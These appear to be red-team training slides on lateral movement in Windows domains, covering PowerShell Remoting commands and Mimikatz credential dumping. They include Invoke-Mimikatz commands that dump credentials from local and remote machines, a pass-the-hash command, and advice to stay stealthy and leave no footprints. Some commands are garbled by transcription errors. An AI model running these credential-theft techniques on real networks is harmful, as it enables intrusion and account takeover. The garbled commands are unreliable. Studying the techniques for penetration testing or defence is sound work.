# Lateral Movement
    • Lateral Movement
    • The Adversary will try to move laterally in the environment in search for some critical
    • Some of the techniques that can be used are :
    • PowerShell Remoting
    • Windows Management Instrumentation (WM!)
    • Invoke-Mimikatz.psl etc
    • It is advised to choose a method which is stealth and leave almost no footprints on ANY
    machines the Adversary is targeting.

## PowerShell Remoting
    • It used WinRM protocol and runs by-default on TCP ports 5985 (HTTP) and 5986 (HTTPS)
    • It is a recommended way to manage Windows core servers.
    • This comes enabled by-default from Windows Server 2012.
    • Adversary uses this utility to connect to remote computers/servers and execute commands upon
    achieving high privileges.
    • Example : Invoke-Command, New-PSSession, Enter-PSSession

        • Configuration is easy "Enable-PSRemoting -SkipNetworkProfiIeCheck -Verbose -Force"
    administrator.
    • It is used to run commands and scripts on :
    • Windows Servers/workstations
    • Linux machines too (PowerShell is Open-Source project)
    • Example commands :
1. $session = New-PSSession -Computername Windows-Server
2. Invoke-Command -Session $session -ScriptBlock {Whoami;hostname}
3. Enter-Pssession -Session $session -verbose
4. klist
5. exit


## Mimikatz PowerShell Script
    • Used for dumping credentials, Kerberos tickets etc all in-memory.
    • Run with Administrative privileges for performing credential dumping operations.
    • Ex : (As Administrator)
    Invoke-Mimikatz -DumpCreds -Verbose
    Invoke-Mimikatz -DumpCreds -ComputerName @("comp1","comp2")
    • Most famous Pass-the-hash attack:
    Invoke-Mimikatz -Command /user:Administrator /domain:cyberwarfare.corp/hash:/run:powershell.exqx"'
